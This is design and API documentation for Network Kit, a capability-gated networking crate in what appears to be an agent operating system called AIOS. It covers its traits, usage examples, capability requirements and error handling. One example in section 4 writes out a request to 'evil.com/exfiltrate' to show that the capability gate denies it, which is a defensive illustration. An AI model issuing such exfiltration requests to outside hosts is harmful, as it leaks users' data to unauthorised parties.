# Network Kit

**Layer:** Platform | **Crate:** `aios_network` | **Architecture:** [`docs/platform/networking.md`](../../platform/networking.md)

**Related:** [anm.md](../../platform/networking/anm.md) — AIOS Network Model, [mesh.md](../../platform/networking/mesh.md) — Mesh Layer, [bridge.md](../../platform/networking/bridge.md) — Bridge Module

## 1. Overview

Network Kit provides capability-gated networking with Space-aware name resolution,
connection lifecycle management, and per-agent traffic isolation. Every outbound connection
from an agent must pass through the Network Transport Manager (NTM), which enforces that
the agent holds an explicit `NetworkAccess` capability before any packet leaves its sandbox.
This is a fundamental departure from traditional operating systems where any process can open
a socket to any destination.

The NTM is composed of six components that work together: SpaceResolver translates
Space names and URIs to network addresses, ConnectionManager handles TCP/UDP/QUIC
lifecycle with per-agent isolation, ShadowEngine optionally proxies traffic for privacy,
ResilienceEngine provides retry logic and circuit breakers, BandwidthScheduler enforces
per-agent QoS, and CapabilityGate validates capabilities before any I/O. Under the hood,
the network stack uses smoltcp for the TCP/IP implementation and rustls for TLS, with
VirtIO-Net as the primary driver on QEMU and platform-specific drivers on hardware.

Use Network Kit when your agent needs to make HTTP requests, open WebSocket connections,
perform DNS lookups, or communicate with network peers. Do not use it for local inter-agent
communication (use [IPC Kit](../kernel/ipc.md) instead) or for device-to-device sync
(use [Storage Kit](./storage.md) SpaceSync, which uses Network Kit internally).

## 2. Core Traits

```rust
use aios_capability::CapabilityHandle;
use aios_network::tls::TlsConfig;
use std::time::Duration;

/// Translates Space-aware URIs and names to network addresses.
///
/// SpaceResolver provides capability-gated DNS that respects the agent's
/// network access policy. Lookups for blocked domains return an error
/// rather than silently failing.
///
/// **ANM context:** Resolution checks the mesh peer table first. If the
/// target space is hosted by a known mesh peer, resolution returns a mesh
/// endpoint (no DNS involved). DNS lookup through the Bridge Module is
/// the fallback for internet-facing spaces.
pub trait SpaceResolver {
    /// Resolve a hostname to one or more IP addresses.
    fn resolve(&self, hostname: &str) -> Result<Vec<IpAddr>, NetworkError>;

    /// Resolve a Space URI (e.g., "space://user/shared/photos") to a
    /// network endpoint for sync operations.
    fn resolve_space(&self, uri: &SpaceUri) -> Result<Endpoint, NetworkError>;

    /// Resolve with a custom timeout.
    fn resolve_with_timeout(&self, hostname: &str, timeout: Duration)
        -> Result<Vec<IpAddr>, NetworkError>;
}

/// Manages connection lifecycle with per-agent isolation.
///
/// Each connection is associated with the creating agent's identity.
/// ConnectionManager enforces that agents cannot access each other's
/// connections and that all connections respect capability constraints.
///
/// **ANM context:** ConnectionManager manages **Bridge connections**
/// (TCP/TLS/QUIC to internet endpoints). Mesh peer connections are
/// managed by the separate `MeshManager` trait. Agents do not choose
/// between mesh and Bridge — the SpaceResolver routes automatically.
pub trait ConnectionManager {
    /// Open a TCP connection to the specified endpoint.
    fn connect_tcp(&self, addr: &Endpoint) -> Result<TcpStream, NetworkError>;

    /// Open a TLS-encrypted TCP connection.
    fn connect_tls(&self, addr: &Endpoint, config: &TlsConfig)
        -> Result<TlsStream, NetworkError>;

    /// Open a QUIC connection (HTTP/3 transport).
    fn connect_quic(&self, addr: &Endpoint, config: &TlsConfig)
        -> Result<QuicConnection, NetworkError>;

    /// Open a UDP socket bound to a local port.
    fn bind_udp(&self, port: u16) -> Result<UdpSocket, NetworkError>;

    /// Open a WebSocket connection.
    fn connect_websocket(&self, url: &str) -> Result<WebSocket, NetworkError>;

    /// List all active connections for the current agent.
    fn active_connections(&self) -> Vec<ConnectionInfo>;

    /// Close a specific connection by its identifier.
    fn close(&self, conn_id: &ConnectionId) -> Result<(), NetworkError>;
}

/// HTTP client built on top of ConnectionManager.
///
/// Provides a high-level HTTP/1.1 and HTTP/2 interface. For HTTP/3 (QUIC),
/// use `connect_quic()` on ConnectionManager directly.
///
/// **ANM context:** HttpClient is a **Bridge Module** trait. HTTP is not
/// used for mesh peer communication — mesh peers exchange space operations
/// directly via the Noise-encrypted mesh protocol. HttpClient is used
/// exclusively for internet-facing traffic (web APIs, downloads, etc.).
pub trait HttpClient {
    /// Send an HTTP request and receive the response.
    fn send(&self, request: HttpRequest) -> Result<HttpResponse, NetworkError>;

    /// Send a request with streaming response body.
    fn send_streaming(&self, request: HttpRequest)
        -> Result<StreamingResponse, NetworkError>;
}

/// Optional traffic proxying for privacy-sensitive connections.
///
/// ShadowEngine routes traffic through a proxy to shield the agent's
/// network identity. This is opt-in and requires the ShadowAccess capability.
///
/// **ANM context:** Shadows are content-addressed (SHA-256 hashes), not
/// URL-based. The Shadow Engine caches space objects by content hash,
/// enabling deduplication and offline access regardless of the object's
/// origin (mesh peer or internet endpoint).
pub trait ShadowEngine {
    /// Check whether shadow routing is available.
    fn is_available(&self) -> bool;

    /// Enable shadow routing for subsequent connections.
    fn enable(&mut self) -> Result<(), NetworkError>;

    /// Disable shadow routing.
    fn disable(&mut self) -> Result<(), NetworkError>;

    /// Check the current shadow routing status.
    fn status(&self) -> ShadowStatus;
}

/// Retry logic, circuit breakers, and fallback routing.
pub trait ResilienceEngine {
    /// Configure retry policy for a connection or request.
    fn set_retry_policy(&mut self, policy: RetryPolicy) -> Result<(), NetworkError>;

    /// Check the circuit breaker state for an endpoint.
    fn circuit_state(&self, endpoint: &Endpoint) -> CircuitState;

    /// Manually reset a tripped circuit breaker.
    fn reset_circuit(&mut self, endpoint: &Endpoint) -> Result<(), NetworkError>;
}

/// Per-agent bandwidth quotas and QoS enforcement.
pub trait BandwidthScheduler {
    /// Query the current bandwidth allocation for this agent.
    fn allocation(&self) -> BandwidthAllocation;

    /// Query current bandwidth usage.
    fn usage(&self) -> BandwidthUsage;

    /// Request a temporary bandwidth increase (may be denied).
    fn request_burst(&mut self, bytes: u64, duration: Duration)
        -> Result<BurstGrant, NetworkError>;
}

/// Mesh peer discovery, connection management, and routing.
///
/// MeshManager handles the AIOS mesh layer — peer-to-peer communication
/// between AIOS devices using Noise IK encryption. Unlike Bridge connections
/// (TCP/TLS to internet endpoints), mesh connections operate over raw
/// Ethernet frames (Direct Link) or QUIC tunnels (Tunnel mode) with no
/// HTTP, DNS, or TLS involved.
///
/// Agents do not typically call MeshManager directly — the SpaceResolver
/// transparently routes space operations to mesh peers when appropriate.
/// MeshManager is exposed for system agents that need direct peer management
/// (e.g., the pairing agent, sync agent, or Inspector).
pub trait MeshManager {
    /// Discover peers on the local network via link-local broadcast.
    ///
    /// Sends an ANNOUNCE frame (EtherType 0x4149) and collects
    /// ANNOUNCE_REPLY responses from known peers within a timeout.
    fn discover_local_peers(&self) -> Result<Vec<PeerEntry>, NetworkError>;

    /// Establish a Noise IK session with a known peer.
    ///
    /// The peer must be in the pairing database (known static key).
    /// Returns a NoiseSession that can be used for space operations.
    /// Direct Link is attempted first; falls back to Tunnel if unavailable.
    fn connect_peer(&self, peer: DeviceId) -> Result<NoiseSession, NetworkError>;

    /// Send a mesh packet to a peer (selects best transport mode).
    ///
    /// Transport selection: Direct Link if peer is on the same L2 network,
    /// Tunnel (QUIC) otherwise. The capability token in the packet is
    /// verified by the receiving peer's kernel.
    fn send(&self, peer: DeviceId, packet: MeshPacket) -> Result<(), NetworkError>;

    /// Receive the next mesh packet from any peer.
    ///
    /// Blocks until a packet arrives or timeout. The packet's capability
    /// token has already been verified by the local kernel before delivery.
    fn recv(&self) -> Result<(DeviceId, MeshPacket), NetworkError>;

    /// Get the current peer table.
    ///
    /// Returns all known peers with their current transport mode,
    /// granted capabilities, and last-seen timestamps.
    fn peer_table(&self) -> &PeerTable;

    /// Exchange capabilities with a peer.
    ///
    /// Offers a set of capabilities to the peer and receives their
    /// grants in return. Capabilities are attenuated — the peer receives
    /// only the permissions specified in the offers, never more than
    /// the local agent holds.
    fn exchange_capabilities(&self, peer: DeviceId, offers: &[CapabilityOffer])
        -> Result<Vec<CapabilityGrant>, NetworkError>;
}
```

## 3. Usage Patterns

**Minimal -- make an HTTP GET request:**

```rust
use aios_network::{NetworkKit, HttpRequest, HttpMethod};

let response = NetworkKit::http()
    .send(HttpRequest {
        method: HttpMethod::Get,
        url: "https://api.example.com/data".into(),
        headers: vec![("Accept".into(), "application/json".into())],
        body: None,
        timeout: Some(Duration::from_secs(30)),
    })?;

println!("Status: {}", response.status);
let body = String::from_utf8(response.body)?;
```

**Realistic -- WebSocket connection with resilience:**

```rust
use aios_network::{NetworkKit, RetryPolicy};

// Configure retry policy before connecting
NetworkKit::resilience().set_retry_policy(RetryPolicy {
    max_retries: 5,
    base_delay: Duration::from_millis(500),
    max_delay: Duration::from_secs(30),
    backoff: BackoffStrategy::Exponential,
})?;

// Open a WebSocket with automatic reconnection
let mut ws = NetworkKit::connections().connect_websocket(
    "wss://realtime.example.com/events"
)?;

loop {
    match ws.recv() {
        Ok(message) => handle_event(message),
        Err(NetworkError::ConnectionClosed) => {
            // ResilienceEngine handles reconnection transparently
            ws = NetworkKit::connections().connect_websocket(
                "wss://realtime.example.com/events"
            )?;
        }
        Err(e) => return Err(e.into()),
    }
}
```

**Advanced -- streaming download with bandwidth awareness:**

```rust
use aios_network::{NetworkKit, HttpRequest, HttpMethod};

// Check available bandwidth before starting a large download
let allocation = NetworkKit::bandwidth().allocation();
if allocation.remaining_bytes < 50_000_000 {
    // Request a burst for a large file
    NetworkKit::bandwidth().request_burst(
        100_000_000,
        Duration::from_secs(60),
    )?;
}

let mut response = NetworkKit::http().send_streaming(HttpRequest {
    method: HttpMethod::Get,
    url: "https://cdn.example.com/large-model.bin".into(),
    headers: vec![],
    body: None,
    timeout: Some(Duration::from_secs(300)),
})?;

let mut total = 0u64;
while let Some(chunk) = response.next_chunk()? {
    storage.write_chunk(&chunk)?;
    total += chunk.len() as u64;
    update_progress(total, response.content_length());
}
```

> **Common Mistakes**
>
> - **Not requesting `NetworkAccess` capability.** Without it, all network operations fail
>   with `NetworkError::CapabilityDenied`. Declare the capability in your agent manifest.
> - **Hardcoding IP addresses.** Always use SpaceResolver for DNS. Hardcoded IPs bypass
>   the capability gate's domain-level policy enforcement.
> - **Ignoring bandwidth quotas.** Large downloads without checking `BandwidthScheduler`
>   will be throttled or terminated. Check allocation before bulk transfers.
> - **Using Network Kit for local IPC.** Network Kit adds overhead for local communication.
>   Use IPC Kit channels for agent-to-agent messaging on the same device.

## 4. Integration Examples

**Network Kit + Capability Kit -- scoped network access:**

```rust
use aios_network::NetworkKit;
use aios_capability::CapabilityKit;

// Network access is scoped to specific domains in the capability grant.
// Attempting to connect to a domain not in the allow-list fails.

let response = NetworkKit::http().send(HttpRequest {
    method: HttpMethod::Get,
    url: "https://api.example.com/data".into(),  // Allowed by capability
    ..Default::default()
})?;

// This would fail if "evil.com" is not in the agent's allowed domains:
let result = NetworkKit::http().send(HttpRequest {
    method: HttpMethod::Get,
    url: "https://evil.com/exfiltrate".into(),
    ..Default::default()
});
assert!(matches!(result, Err(NetworkError::CapabilityDenied(_))));
```

**Network Kit + Storage Kit -- downloading to a Space:**

```rust
use aios_network::NetworkKit;
use aios_storage::{StorageKit, CreateObjectRequest, ContentType};

// Download a file and store it directly in a Space
let response = NetworkKit::http().send(HttpRequest {
    method: HttpMethod::Get,
    url: "https://example.com/report.pdf".into(),
    ..Default::default()
})?;

let mut space = StorageKit::open_space("com.example.downloads")?;
space.create_object(CreateObjectRequest {
    name: "report.pdf".into(),
    content_type: ContentType::Pdf,
    data: response.body,
    tags: vec!["download".into()],
})?;
```

**Network Kit + Flow Kit -- streaming API responses to Flow:**

```rust
use aios_network::NetworkKit;
use aios_flow::{FlowKit, FlowEntry, TypedContent};

// Stream server-sent events into the Flow system
let mut response = NetworkKit::http().send_streaming(HttpRequest {
    method: HttpMethod::Get,
    url: "https://api.example.com/events".into(),
    headers: vec![("Accept".into(), "text/event-stream".into())],
    ..Default::default()
})?;

while let Some(chunk) = response.next_chunk()? {
    let event = parse_sse_event(&chunk)?;
    FlowKit::push(FlowEntry {
        content: TypedContent::new(event.data.as_bytes(), ContentType::Json),
        source: AgentId::current(),
        channel: "api-events".into(),
        ..Default::default()
    })?;
}
```

## 5. Capability Requirements

| Method | Required Capability | Notes |
| --- | --- | --- |
| `SpaceResolver::resolve` | `NetworkAccess` | DNS resolution gated by domain policy |
| `ConnectionManager::connect_tcp` | `NetworkAccess` | Scoped to allowed endpoints |
| `ConnectionManager::connect_tls` | `NetworkAccess` | Same as TCP; TLS is the default |
| `ConnectionManager::bind_udp` | `NetworkAccess(Listen)` | Listening requires explicit grant |
| `HttpClient::send` | `NetworkAccess` | Domain-scoped; checked per-request |
| `ShadowEngine::enable` | `ShadowAccess` | Optional privacy routing capability |
| `BandwidthScheduler::request_burst` | `NetworkAccess` | Burst may be denied by policy |

```toml
# Agent manifest example
[capabilities.required]
NetworkAccess = { domains = ["api.example.com", "cdn.example.com"], protocols = ["https"] }

[capabilities.optional]
ShadowAccess = { reason = "Privacy-routed connections for sensitive API calls" }
NetworkAccessWebSocket = { domains = ["*.example.com"], protocols = ["wss"], reason = "WebSocket for real-time updates" }
```

## 6. Error Handling

```rust
/// Errors returned by Network Kit operations.
#[derive(Debug)]
pub enum NetworkError {
    /// The required NetworkAccess capability was not granted.
    CapabilityDenied(Capability),

    /// DNS resolution failed for the given hostname.
    ResolutionFailed { hostname: String, reason: String },

    /// The connection attempt timed out.
    ConnectionTimeout { endpoint: Endpoint, timeout: Duration },

    /// The remote peer closed the connection.
    ConnectionClosed,

    /// TLS handshake failed (certificate validation, protocol mismatch).
    TlsError(String),

    /// The agent's bandwidth quota has been exhausted.
    BandwidthExhausted { used: u64, quota: u64 },

    /// The circuit breaker for this endpoint is open (too many failures).
    CircuitOpen { endpoint: Endpoint, retry_after: Duration },

    /// The request exceeded the maximum retry count.
    RetriesExhausted { attempts: u32, last_error: Box<NetworkError> },

    /// The HTTP response indicated an error status.
    HttpError { status: u16, body: Vec<u8> },

    /// A WebSocket protocol error occurred.
    WebSocketError(String),

    /// The network interface is not available (no connectivity).
    NoConnectivity,

    /// An I/O error occurred at the transport layer.
    IoError(String),
}
```

**Recovery guidance:**

| Error | Recovery |
| --- | --- |
| `CapabilityDenied` | Check agent manifest; add required domain to capability request |
| `ConnectionTimeout` | Increase timeout or check endpoint availability |
| `TlsError` | Verify certificate chain; check system clock for expiry issues |
| `BandwidthExhausted` | Wait for quota reset or request burst allocation |
| `CircuitOpen` | Wait for `retry_after` duration; endpoint is temporarily unhealthy |
| `NoConnectivity` | Queue operations for retry; listen for connectivity change events |

## 7. Platform & AI Availability

**AIRS-enhanced features (require AIRS Kit):**

| Feature | What AIRS provides | Without AIRS |
| --- | --- | --- |
| Predictive prefetch | Pre-resolves and pre-connects to likely endpoints | On-demand connection only |
| Learned congestion control | ML-tuned TCP/QUIC parameters per network condition | Static congestion control |
| Anomaly detection | Identifies unusual traffic patterns from agents | Static rate limiting only |
| Smart retry timing | Learns optimal retry delays per endpoint | Exponential backoff |

**Platform availability:**

| Platform | TCP/TLS | QUIC/HTTP3 | WebSocket | Shadow Engine | Notes |
| --- | --- | --- | --- | --- | --- |
| QEMU virt | VirtIO-Net | Full | Full | Proxy only | User-mode networking |
| Raspberry Pi 4 | Ethernet/WiFi | Full | Full | Full | Hardware NIC |
| Raspberry Pi 5 | Ethernet/WiFi | Full | Full | Full | Hardware NIC |
| Apple Silicon | Platform NIC | Full | Full | Full | Native drivers |

**Implementation phase:** Phase 9+ (core networking stack, VirtIO-Net, smoltcp, HTTP).
QUIC/HTTP3 in Phase 9+. WebSocket in Phase 9+. Shadow Engine in Phase 13+.

## 8. Technology Stack (ANM Split)

The networking subsystem is organized into two layers per the AIOS Network Model:

**Mesh Layer** (peer-to-peer, serverless):

| Component | Crate | Purpose |
| --- | --- | --- |
| Noise IK protocol | `snow` | Encrypted peer sessions (0-RTT with known keys) |
| Direct Link framing | custom | Raw Ethernet frames, EtherType `0x4149` |
| Peer discovery | custom | Link-local ANNOUNCE/ANNOUNCE_REPLY protocol |
| Capability exchange | custom | L4 capability negotiation over Noise |
| Peer table | custom | DeviceId-indexed session and capability tracking |

**Bridge Module** (internet-facing, traditional networking):

| Component | Crate | Purpose |
| --- | --- | --- |
| TCP/IP stack | `smoltcp` | TCP, UDP, ICMP, ARP, IPv4/IPv6 |
| TLS | `rustls` | TLS 1.3, certificate validation |
| QUIC/HTTP3 | `quinn` | QUIC transport, also used for mesh Tunnel mode |
| HTTP/1.1 & HTTP/2 | `h2` / custom | High-level HTTP client |
| DNS | `smoltcp` + custom | DNS resolution (Bridge fallback after mesh peer lookup) |
| Credential vault | custom | Automatic credential injection for HTTP requests |

The SpaceResolver sits above both layers: it checks the mesh peer table first, and falls back to Bridge DNS resolution for unknown spaces.

---

*See also: [IPC Kit](../kernel/ipc.md) | [Capability Kit](../kernel/capability.md) | [Storage Kit](./storage.md) | [Flow Kit](./flow.md) | [Wireless Kit](./wireless.md)*
